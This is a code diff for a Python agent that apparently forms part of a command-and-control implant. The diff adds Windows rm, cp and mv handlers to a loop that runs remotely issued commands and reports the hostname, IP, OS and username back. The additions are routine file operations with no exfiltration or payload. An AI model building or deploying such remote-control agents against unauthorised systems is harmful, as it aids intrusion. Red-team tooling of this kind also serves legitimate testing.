@@ -28,6 +28,9 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.hostname import get_hostname 
     from utils.winapi.nslookup import nslookup
     from utils.winapi.mkdir import mkdir
+    from utils.winapi.mv import mv
+    from utils.winapi.cp import cp
+    from utils.winapi.rm import rm
 
 logging.basicConfig(level=logging.INFO)
 smb_pipe_conn = None
@@ -180,10 +183,35 @@ def execute_commands():
                     output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
+            elif os.name == 'nt' and command_text.lower().startswith('rm'):
+                try:
+                    path = command_text.split(' ', 1)[1]
+                    result = rm(path)
+                    status = 'Completed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
             elif os.name == 'nt' and command_text.lower().startswith('mkdir'):
                 try:
                     path = command_text.split(' ', 1)[1]
                     result = mkdir(path)
+                    status = 'Completed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('cp'):
+                try:
+                    parts = command_text.split(' ', 2)
+                    if len(parts) < 3:
+                        raise ValueError("Invalid cp command format. Use 'cp <source> <destination>'.")
+                    src, dst = parts[1], parts[2]
+                    result = cp(src, dst)
                     status = 'Completed'
                     output = result
                 except Exception as e:
@@ -252,6 +280,20 @@ def execute_commands():
                         status = 'Failed'
                         output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('mv'):
+                try:
+                    parts = command_text.split(' ', 2)
+                    if len(parts) < 3:
+                        raise ValueError("Invalid mv command format. Use 'mv <source> <destination>'.")
+                    src, dst = parts[1], parts[2]
+                    result = mv(src, dst)
+                    status = 'Completed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)    
 
             elif os.name == 'nt' and command_text.lower().startswith('users '):
                 try:
